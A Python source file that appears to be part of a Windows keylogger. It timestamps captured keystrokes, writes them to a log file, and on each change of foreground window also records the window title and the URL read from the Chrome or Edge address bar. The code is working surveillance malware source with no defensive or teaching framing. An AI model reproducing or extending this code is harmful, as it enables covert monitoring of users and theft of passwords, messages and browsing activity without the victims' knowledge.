from datetime import datetime
from storage.file_handler import write_log
import win32gui
import uiautomation as auto
from uiautomation import UIAutomationInitializerInThread

_last_window = None

def get_active_window():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def get_browser_url():
    try:
        with UIAutomationInitializerInThread():
            chrome = auto.WindowControl(searchDepth=1, ClassName='Chrome_WidgetWin_1')
            if chrome.Exists(0, 0):
                addr_bar = chrome.EditControl(Name='Address and search bar')
                return addr_bar.GetValuePattern().Value
            edge = auto.WindowControl(searchDepth=1, ClassName='Windows.UI.Core.CoreWindow')
            if edge.Exists(0, 0):
                addr_bar = edge.EditControl(Name='Search or enter web address')
                return addr_bar.GetValuePattern().Value
        return None
    except Exception:
        return None

def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key}]"

def save_keystroke(key_str):
    global _last_window
    active_window = get_active_window()
    if active_window != _last_window:
        _last_window = active_window
        url = get_browser_url()
        if url:
            write_log(f"\n\n=== {active_window} | {url} ===\n")
        else:
            write_log(f"\n\n=== {active_window} ===\n")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - {key_str}\n"
    write_log(log_entry)
